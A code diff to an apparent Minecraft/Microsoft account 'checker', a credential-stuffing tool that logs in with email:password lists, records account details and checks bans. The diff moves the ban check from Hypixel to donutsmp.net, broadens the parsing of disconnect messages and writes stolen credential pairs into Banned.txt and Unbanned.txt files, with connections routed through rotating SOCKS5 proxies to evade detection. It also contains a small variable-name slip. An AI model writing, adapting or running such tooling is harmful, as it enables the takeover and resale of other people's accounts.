@@ -77,7 +77,7 @@ class Capture:
         if self.access != None: message+=f"\nEmail Access: {self.access}"
         if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
         if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
-        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
+        if config.get('hypixelban') is True: message+=f"\nDonutSMP Banned: {self.banned or 'Unknown'}"
         if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
         if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
         return message+"\n============================\n"
@@ -201,38 +201,71 @@ class Capture:
     
     def ban(self):
         global errors
-        if config.get('hypixelban') is True:
+        if config.get('hypixelban') is True:  # Keep the same config name for consistency
             auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
             auth_token.profile = Profile(id_=self.uuid, name=self.name)
             tries = 0
             while tries < maxretries:
-                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
+                # Changed server to donutsmp.net instead of alpha.hypixel.net
+                connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
+                
                 @connection.listener(clientbound.login.DisconnectPacket, early=True)
                 def login_disconnect(packet):
                     data = json.loads(str(packet.json_data))
-                    if "Suspicious activity" in str(data):
-                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
-                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                    elif "temporarily banned" in str(data):
-                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
-                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                    elif "You are permanently banned from this server!" in str(data):
-                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
-                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                    elif "The Hypixel Alpha server is currently closed!" in str(data):
-                        self.banned = "False"
-                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
-                    elif "Failed cloning your SkyBlock data" in str(data):
-                        self.banned = "False"
-                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                    
+                    # Updated ban detection patterns for DonutSMP
+                    if "banned" in str(data).lower():
+                        # Generic ban detection
+                        ban_text = ''.join(item.get("text", "") for item in data.get("extra", []) if isinstance(item, dict))
+                        self.banned = f"[Permanently] {ban_text}"
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
+                    elif "temporarily banned" in str(data).lower():
+                        # Temporary ban detection
+                        ban_text = ''.join(item.get("text", "") for item in data.get("extra", []) if isinstance(item, dict))
+                        self.banned = f"[Temporary] {ban_text}"
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
+                    elif "kick" in str(data).lower() and "ban" in str(data).lower():
+                        # Kicked with ban message
+                        ban_text = ''.join(item.get("text", "") for item in data.get("extra", []) if isinstance(item, dict))
+                        self.banned = f"[Kicked/Banned] {ban_text}"
+                        with open(f"results/{fname}/Banned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
+                    elif any(phrase in str(data).lower() for phrase in ["whitelist", "not whitelisted"]):
+                        # Server is whitelisted but account not banned
+                        self.banned = "False (Not Whitelisted)"
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
+                    elif any(phrase in str(data).lower() for phrase in ["server is full", "server full"]):
+                        # Server is full but account not banned
+                        self.banned = "False (Server Full)"
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
+                    elif "outdated" in str(data).lower():
+                        # Version mismatch but not banned
+                        self.banned = "False (Version Mismatch)"
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
                     else:
-                        self.banned = ''.join(item["text"] for item in data["extra"])
-                        with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        # Unknown disconnect reason - treat as potentially banned
+                        disconnect_text = ''.join(item.get("text", "") for item in data.get("extra", []) if isinstance(item, dict))
+                        if disconnect_text.strip():
+                            self.banned = f"[Unknown] {disconnect_text}"
+                            with open(f"results/{fname}/Banned.txt", 'a') as f: 
+                                f.write(f"{self.email}:{self.password}\n")
+                        else:
+                            self.banned = "Unknown Disconnect"
+                            with open(f"results/{fname}/Banned.txt", 'a') as f: 
+                                f.write(f"{self.email}:{self.password}\n")
+                
                 @connection.listener(clientbound.play.JoinGamePacket, early=True)
                 def joined_server(packet):
                     if self.banned == None:
                         self.banned = "False"
-                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
+                        with open(f"results/{fname}/Unbanned.txt", 'a') as f: 
+                            f.write(f"{self.email}:{self.password}\n")
+                
                 try:
                     if len(banproxies) > 0:
                         proxy = random.choice(banproxies)
@@ -243,19 +276,24 @@ class Capture:
                             ip_port = proxy.split(':')
                             socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                         socket.socket = socks.socksocket
+                    
                     original_stderr = sys.stderr
                     sys.stderr = StringIO()
                     try: 
                         connection.connect()
                         c = 0
-                        while self.banned == None or c < 1000:
+                        while self.banned == None and c < 1000:  # Wait for response
                             time.sleep(.01)
                             c+=1
                         connection.disconnect()
-                    except: pass
+                    except: 
+                        pass
                     sys.stderr = original_stderr
-                except: pass
-                if self.banned != None: break
+                except: 
+                    pass
+                
+                if self.banned != None: 
+                    break
                 tries+=1
 
     def handle(self):
@@ -537,7 +575,7 @@ def logscreen():
     threading.Thread(target=logscreen).start()    
 
 def cuiscreen():
-    global cpm, cpm1
+    global cpm, cmp1
     os.system('cls')
     cmp1 = cpm
     cpm = 0
@@ -625,7 +663,7 @@ MC Capes: <capes>
 Email Access: <access>
 Hypixel Skyblock Coins: <skyblockcoins>
 Hypixel Bedwars Stars: <bedwarsstars>
-Banned: <banned>
+DonutSMP Banned: <banned>
 Can Change Name: <namechange>
 Last Name Change: <lastchanged>'''}
         c['Scraper'] = {
@@ -641,7 +679,7 @@ Last Name Change: <lastchanged>'''}
             'Email Access': True,
             'Hypixel Skyblock Coins': True,
             'Hypixel Bedwars Stars': True,
-            'Hypixel Ban': True,
+            'DonutSMP Ban': True,
             'Name Change Availability': True,
             'Last Name Change': True
         }
@@ -663,7 +701,7 @@ Last Name Change: <lastchanged>'''}
     config.set('access', str_to_bool(read_config['Captures']['Email Access']))
     config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
     config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
-    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
+    config.set('hypixelban', str_to_bool(read_config['Captures']['DonutSMP Ban']))
     config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
     config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
 
@@ -766,7 +804,7 @@ def Main():
         print(Fore.LIGHTBLUE_EX+"Select your proxies")
         Proxys()
     if config.get('proxylessban') == False and config.get('hypixelban') is True:
-        print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
+        print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 DonutSMP Ban Checking Proxies.")
         banproxyload()
     if proxytype =="'5'":
         print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
